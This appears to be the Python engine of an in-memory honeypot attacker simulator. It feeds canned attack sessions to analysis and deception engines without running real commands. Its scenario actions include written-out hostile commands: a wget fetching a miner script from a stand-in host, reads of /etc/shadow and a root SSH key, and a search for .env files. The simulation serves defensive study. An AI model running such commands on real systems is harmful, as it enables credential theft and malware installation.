"""
simulator/engine.py — In-memory simulation engine for the Linux Attacker Simulator.

Executes supported simulation commands on a fictional in-memory Linux honeypot
environment without ever invoking shell executors, subprocesses, or real system calls.

Maintains:
- Active simulated attacker session ID.
- Chronological session event history.
- Live integration with analysis.engine (Phase 2) and deception.engine (Phase 3).
- Strict command allowlist and fictional filesystem responses.

SAFETY GUARANTEES:
- No subprocess, shell, PowerShell, or operating system execution.
- No network requests or real socket connections.
- Output generated exclusively from in-memory fictional templates and WorldState.
"""

from __future__ import annotations

import uuid
from datetime import datetime, timezone
from typing import Any

from analysis.engine import analyse_session
from deception.engine import DeceptionEngine
from deception.world_state import WorldState

# Explicit allowlist of supported simulation commands
SUPPORTED_COMMANDS = frozenset({
    "help",
    "whoami",
    "hostname",
    "pwd",
    "ls",
    "cat",
    "ps",
    "ip",
    "ifconfig",
    "uname",
    "id",
    "exit",
})

# Supported high-level attack actions
SUPPORTED_ACTIONS = frozenset({
    "reconnaissance",
    "authentication_abuse",
    "file_discovery",
    "download_attempt",
    "privilege_escalation",
    "benign_activity",
})

DEFAULT_SRC_IP = "192.0.2.199"
DEFAULT_DST_IP = "192.0.2.10"
DEFAULT_PORT = 2222


class SimulatorEngine:
    """
    Manages in-memory attacker sessions, command interpretation, and live
    telemetry generation connected to the analysis and deception engines.
    """

    def __init__(self, world_state: WorldState | None = None) -> None:
        self.deception_engine = DeceptionEngine(
            world_state=world_state if world_state is not None else WorldState.create_default()
        )
        self.session_id: str = self._generate_session_id()
        self.events: list[dict[str, Any]] = []
        self.terminal_history: list[dict[str, str]] = []
        self.last_analysis: dict[str, Any] | None = None
        self.last_deception: dict[str, Any] | None = None
        self.session_history: list[dict[str, Any]] = []

        # Record initial connect event
        self._record_event("session_connect")

    @property
    def world_state(self) -> WorldState:
        return self.deception_engine.world_state

    def _generate_session_id(self) -> str:
        return f"sim-sess-{uuid.uuid4().hex[:8]}"

    def _now(self) -> str:
        return datetime.now(timezone.utc).isoformat()

    def _record_event(self, event_type: str, **extra: Any) -> dict[str, Any]:
        evt: dict[str, Any] = {
            "timestamp": self._now(),
            "session_id": self.session_id,
            "event_type": event_type,
            "source_ip": DEFAULT_SRC_IP,
            "destination_ip": DEFAULT_DST_IP,
            "destination_port": DEFAULT_PORT,
        }
        evt.update(extra)
        self.events.append(evt)
        return evt

    def start_new_session(self) -> str:
        """Start a fresh simulated session ID, archiving previous session if active."""
        if self.events and len(self.events) > 1:
            analysis = self.last_analysis or analyse_session(self.events, session_id=self.session_id)
            deception = self.last_deception or {
                "status": "no_action_required",
                "policy_id": "none",
                "action": {"action_id": "no_op", "target": None},
                "explanation": "No deception action required.",
                "state_change_applied": {},
                "error": None,
            }
            self.session_history.append({
                "session_id": self.session_id,
                "events": list(self.events),
                "analysis": analysis,
                "deception": deception,
            })

        self.session_id = self._generate_session_id()
        self.events = []
        self.terminal_history = []
        self.last_analysis = None
        self.last_deception = None
        self._record_event("session_connect")
        return self.session_id

    def reset(self) -> None:
        """Reset session and restore fictional WorldState to clean baseline."""
        self.session_history.clear()
        self.deception_engine.reset()
        self.session_id = self._generate_session_id()
        self.events = []
        self.terminal_history = []
        self.last_analysis = None
        self.last_deception = None
        self._record_event("session_connect")

    def execute_command(self, raw_command: str) -> dict[str, Any]:
        """
        Safely execute a simulated command from the allowlist in-memory.

        Parameters
        ----------
        raw_command:
            The raw text string entered by the user in the terminal.

        Returns
        -------
        dict[str, Any]
            Terminal output, generated event, analysis result, deception decision,
            and world state summary.
        """
        cmd_clean = (raw_command or "").strip()
        if not cmd_clean:
            return self._format_response("", "empty")

        tokens = cmd_clean.split()
        base_cmd = tokens[0].lower()
        args = tokens[1:]

        # Validate against explicit allowlist
        if base_cmd not in SUPPORTED_COMMANDS:
            output = (
                f"bash: {tokens[0]}: command not supported in simulation environment.\n"
                f"Type 'help' to view the explicit allowlist of simulated commands."
            )
            return self._format_response(output, cmd_clean, supported=False)

        # Generate in-memory simulated output based on command
        output = self._generate_command_output(base_cmd, args, cmd_clean)

        # Generate normalized Cowrie command event
        event = self._record_event("command", command=cmd_clean)

        # Run Phase 2 analysis
        analysis_result = analyse_session(self.events, session_id=self.session_id)
        self.last_analysis = analysis_result

        # Run Phase 3 adaptive deception
        deception_result = self.deception_engine.process(analysis_result)
        self.last_deception = deception_result

        # Save to terminal history
        self.terminal_history.append({"command": cmd_clean, "output": output})

        return self._format_response(output, cmd_clean, event=event)

    def execute_action(self, action_name: str) -> dict[str, Any]:
        """
        Execute a canned scenario action representing an attack phase.
        """
        if action_name not in SUPPORTED_ACTIONS:
            raise ValueError(f"Action '{action_name}' is not in approved actions allowlist.")

        output_lines: list[str] = []

        if action_name == "reconnaissance":
            recon_cmds = ["whoami", "uname -a", "hostname", "id", "ifconfig"]
            for c in recon_cmds:
                out = self._generate_command_output(c.split()[0], c.split()[1:], c)
                self._record_event("command", command=c)
                output_lines.append(f"$ {c}\n{out}\n")

        elif action_name == "authentication_abuse":
            users = ["admin", "root", "test", "guest", "deploy"]
            for u in users:
                self._record_event("login", username=u, success=False)
                output_lines.append(f"ssh {u}@{DEFAULT_DST_IP}: Permission denied (publickey,password).")

        elif action_name == "file_discovery":
            disc_cmds = ["ls -la /var/www", "find / -name \"*.env\" 2>/dev/null", "locate backup"]
            for c in disc_cmds:
                out = self._generate_command_output("ls" if c.startswith("ls") else "find", [], c)
                self._record_event("command", command=c)
                output_lines.append(f"$ {c}\n{out}\n")

        elif action_name == "download_attempt":
            dl_cmd = "wget http://192.0.2.99/miner.sh -O /tmp/miner.sh"
            out = (
                "--2026-01-15 10:14:02--  http://192.0.2.99/miner.sh\n"
                "Connecting to 192.0.2.99:80... connected.\n"
                "HTTP request sent, awaiting response... 200 OK\n"
                "Length: 4096 (4.0K) [application/x-sh]\n"
                "Saving to: '/tmp/miner.sh'\n"
                "2026-01-15 10:14:02 (1.2 MB/s) - '/tmp/miner.sh' saved [4096/4096]"
            )
            self._record_event("command", command=dl_cmd)
            output_lines.append(f"$ {dl_cmd}\n{out}\n")

        elif action_name == "privilege_escalation":
            pe_cmds = ["cat /etc/passwd", "cat /etc/shadow", "cat /root/.ssh/id_rsa"]
            for c in pe_cmds:
                out = self._generate_command_output("cat", [c.split()[-1]], c)
                self._record_event("command", command=c)
                output_lines.append(f"$ {c}\n{out}\n")

        elif action_name == "benign_activity":
            benign_cmds = ["date", "echo 'system health check'"]
            for c in benign_cmds:
                out = self._generate_command_output(c.split()[0], c.split()[1:], c)
                self._record_event("command", command=c)
                output_lines.append(f"$ {c}\n{out}\n")

        combined_output = "\n".join(output_lines)

        # Run analysis and deception
        analysis_result = analyse_session(self.events, session_id=self.session_id)
        self.last_analysis = analysis_result

        deception_result = self.deception_engine.process(analysis_result)
        self.last_deception = deception_result

        self.terminal_history.append({"command": f"[Action: {action_name}]", "output": combined_output})

        return self._format_response(combined_output, f"[Action: {action_name}]")

    def _generate_command_output(self, base_cmd: str, args: list[str], full_cmd: str) -> str:
        """Produce safe in-memory simulated output matching the command."""
        ws = self.world_state

        if base_cmd == "help":
            return (
                "AI Adaptive Cyber Deception System — Simulated Attacker Shell\n"
                "Supported commands:\n"
                "  help               - Display this help message\n"
                "  whoami             - Display current simulated user identity\n"
                "  hostname           - Display simulated honeypot hostname\n"
                "  pwd                - Display current working directory\n"
                "  ls [path]          - List simulated directory contents\n"
                "  cat <file>         - Display simulated file contents\n"
                "  ps [aux]           - List simulated running processes\n"
                "  ip addr / ifconfig - Display simulated network interfaces\n"
                "  uname [-a]         - Display simulated kernel/OS information\n"
                "  id                 - Display simulated UID/GID details\n"
                "  exit               - Terminate current simulated session\n\n"
                "NOTE: All operations are strictly simulated and in-memory."
            )

        if base_cmd == "whoami":
            return "root"

        if base_cmd == "hostname":
            return ws.host.hostname

        if base_cmd == "pwd":
            return "/root"

        if base_cmd == "uname":
            return f"Linux {ws.host.hostname} {ws.host.kernel} #1 SMP {ws.host.architecture} GNU/Linux"

        if base_cmd == "id":
            return "uid=0(root) gid=0(root) groups=0(root)"

        if base_cmd in ("ip", "ifconfig"):
            return (
                f"1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN\n"
                f"    inet 127.0.0.1/8 scope host lo\n"
                f"2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP\n"
                f"    inet {ws.host.primary_ip}/24 brd 192.0.2.255 scope global eth0"
            )

        if base_cmd == "ps":
            return (
                "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
                "root         1  0.0  0.1 168432 11840 ?        Ss   10:00   0:01 /sbin/init\n"
                "root       412  0.0  0.1  14216  6120 ?        Ss   10:00   0:00 /usr/sbin/sshd -D\n"
                "www-data   820  0.0  0.2  54800 14200 ?        S    10:01   0:00 nginx: worker process\n"
                "root      1042  0.0  0.1  12400  4200 pts/0    Ss   10:05   0:00 -bash\n"
                "root      1150  0.0  0.1  15800  3400 pts/0    R+   10:15   0:00 ps aux"
            )

        if base_cmd == "ls":
            target_path = args[0] if args else "/root"
            target_path = target_path.rstrip("/")

            if target_path in ("", "/"):
                return "bin   boot  dev  etc   home  lib   lib64 media mnt  opt   proc  root  run   sbin  srv   sys   tmp   usr   var"

            if target_path == "/var/www":
                items = ["html", "internal"]
                return "  ".join(items)

            if target_path in ("/var/www/internal", "/var/www/internal/"):
                items = ["config.php"]
                if ws.is_decoy_visible("/var/www/internal/.env"):
                    items.append(".env")
                return "  ".join(items)

            if target_path in ("/root/.ssh", "/root/.ssh/"):
                items = ["authorized_keys", "known_hosts"]
                if ws.is_decoy_visible("/root/.ssh/id_rsa_backup"):
                    items.append("id_rsa_backup")
                return "  ".join(items)

            if target_path in ("/home/backup", "/home/backup/"):
                items = ["backup.sh"]
                if ws.is_decoy_visible("/home/backup/db_dump.sql"):
                    items.append("db_dump.sql")
                return "  ".join(items)

            return "total 12\ndrwx------ 2 root root 4096 Jan 15 10:00 .\ndrwxr-xr-x 4 root root 4096 Jan 15 10:00 ..\n-rw------- 1 root root  142 Jan 15 10:01 .bash_history"

        if base_cmd == "cat":
            if not args:
                return "cat: missing file operand"
            target = args[0]

            if target == "/etc/passwd":
                return (
                    "root:x:0:0:root:/root:/bin/bash\n"
                    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                    "deploy:x:1000:1000:deploy:/home/deploy:/bin/bash\n"
                    "backup:x:1001:1001:backup:/home/backup:/bin/bash\n"
                    "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
                )

            if target == "/etc/shadow":
                return (
                    "root:$6$fictional$dEcOyHaShMatEriAl98231:19000:0:99999:7:::\n"
                    "deploy:$6$fictional$aPpHaShVaLuE1029384:19000:0:99999:7:::\n"
                    "backup:*:19000:0:99999:7:::\n"
                    "www-data:*:19000:0:99999:7:::"
                )

            # Check decoy files catalog
            decoy = ws.decoy_files.get(target)
            if decoy is not None and decoy.is_visible:
                return decoy.fake_content

            if decoy is not None and not decoy.is_visible:
                return f"cat: {target}: Permission denied"

            return f"cat: {target}: No such file or directory"

        if base_cmd == "exit":
            self._record_event("session_closed")
            return "logout\nConnection to 192.0.2.10 closed."

        return f"bash: {base_cmd}: command completed."

    def _format_response(
        self,
        output: str,
        command: str,
        supported: bool = True,
        event: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        return {
            "session_id": self.session_id,
            "command": command,
            "supported": supported,
            "terminal_output": output,
            "event": event,
            "event_count": len(self.events),
            "analysis": {
                "primary_category": self.last_analysis.get("primary_category") if self.last_analysis else "unknown",
                "score": self.last_analysis.get("score") if self.last_analysis else 0,
                "findings": self.last_analysis.get("findings", []) if self.last_analysis else [],
                "score_explanation": self.last_analysis.get("score_explanation") if self.last_analysis else "",
            },
            "deception": {
                "status": self.last_deception.get("status") if self.last_deception else "no_action_required",
                "policy_id": self.last_deception.get("policy_id") if self.last_deception else "none",
                "action": self.last_deception.get("action") if self.last_deception else {"action_id": "no_op"},
                "explanation": self.last_deception.get("explanation") if self.last_deception else "No deception action required.",
                "state_change_applied": self.last_deception.get("state_change_applied") if self.last_deception else {},
            },
            "world_state_summary": {
                "discovered_files": sorted(self.world_state.discovered_files),
                "discovered_services": sorted(self.world_state.discovered_services),
                "attacker_interests": list(self.world_state.attacker_interests),
                "action_history_count": len(self.world_state.action_history),
            },
        }

    def has_activity(self) -> bool:
        """Return True if any commands/actions have been executed in this or prior sessions."""
        return (
            len(self.session_history) > 0
            or len(self.events) > 1
            or self.last_analysis is not None
        )

    def get_pipeline_result(self) -> dict[str, Any]:
        """
        Format simulator sessions and events into the standard pipeline result
        schema consumed by the Phase 5 dashboard and its views.
        """
        session_records: list[dict[str, Any]] = []
        total_events = 0

        # Include archived sessions
        for past in self.session_history:
            sid = past["session_id"]
            evts = past["events"]
            total_events += len(evts)
            an = past.get("analysis") or {}
            dec = past.get("deception") or {}
            src_ip = evts[0].get("source_ip", DEFAULT_SRC_IP) if evts else DEFAULT_SRC_IP
            session_records.append({
                "session_id": sid,
                "source_ip": src_ip,
                "event_count": len(evts),
                "analysis": {
                    "primary_category": an.get("primary_category", "unknown"),
                    "score": an.get("score", 0),
                    "findings": an.get("findings", []),
                    "score_explanation": an.get("score_explanation", ""),
                    "warnings": an.get("warnings", []),
                },
                "deception": {
                    "status": dec.get("status", "no_action_required"),
                    "policy_id": dec.get("policy_id", "none"),
                    "action": dec.get("action", {"action_id": "no_op"}),
                    "explanation": dec.get("explanation", "No deception action required."),
                    "state_change_applied": dec.get("state_change_applied", {}),
                    "error": dec.get("error"),
                },
            })

        # Include current active session if it has events or activity
        if self.events:
            total_events += len(self.events)
            active_analysis = self.last_analysis or analyse_session(self.events, session_id=self.session_id)
            active_deception = self.last_deception or {
                "status": "no_action_required",
                "policy_id": "none",
                "action": {"action_id": "no_op"},
                "explanation": "No deception action required.",
                "state_change_applied": {},
                "error": None,
            }
            src_ip = self.events[0].get("source_ip", DEFAULT_SRC_IP) if self.events else DEFAULT_SRC_IP
            session_records.append({
                "session_id": self.session_id,
                "source_ip": src_ip,
                "event_count": len(self.events),
                "analysis": {
                    "primary_category": active_analysis.get("primary_category", "unknown"),
                    "score": active_analysis.get("score", 0),
                    "findings": active_analysis.get("findings", []),
                    "score_explanation": active_analysis.get("score_explanation", ""),
                    "warnings": active_analysis.get("warnings", []),
                },
                "deception": {
                    "status": active_deception.get("status", "no_action_required"),
                    "policy_id": active_deception.get("policy_id", "none"),
                    "action": active_deception.get("action", {"action_id": "no_op"}),
                    "explanation": active_deception.get("explanation", "No deception action required."),
                    "state_change_applied": active_deception.get("state_change_applied", {}),
                    "error": active_deception.get("error"),
                },
            })

        has_active = self.has_activity()

        return {
            "loaded": has_active,
            "source": "simulator",
            "source_label": "Attacker Simulator (Interactive)",
            "pipeline_version": "1.0.0",
            "input_file": f"simulator://in-memory/{self.session_id}",
            "events_parsed": total_events if has_active else 0,
            "warnings_count": 0,
            "warnings": [],
            "sessions_count": len(session_records) if has_active else 0,
            "sessions": session_records if has_active else [],
            "world_state": self.world_state.to_dict(),
            "deception_metric": {
                "label": "DECEPTION ACTIONS EXECUTED",
                "value": len([
                    a for a in self.world_state.action_history
                    if a.get("action_id") and a.get("action_id") != "no_op" and a.get("success", True) is not False
                ]),
                "actions_executed_count": len([
                    a for a in self.world_state.action_history
                    if a.get("action_id") and a.get("action_id") != "no_op" and a.get("success", True) is not False
                ]),
                "recommendations_count": len([
                    a for a in self.world_state.action_history
                    if a.get("action_id") and a.get("action_id") != "no_op"
                ]),
                "is_advisory": False,
                "status_note": "Applied to simulated environment",
            },
        }

    def get_state(self) -> dict[str, Any]:
        """Return the current simulator state."""
        return {
            "session_id": self.session_id,
            "event_count": len(self.events),
            "events": list(self.events),
            "terminal_history": list(self.terminal_history),
            "analysis": self.last_analysis or {},
            "deception": self.last_deception or {},
            "world_state": self.world_state.to_dict(),
        }

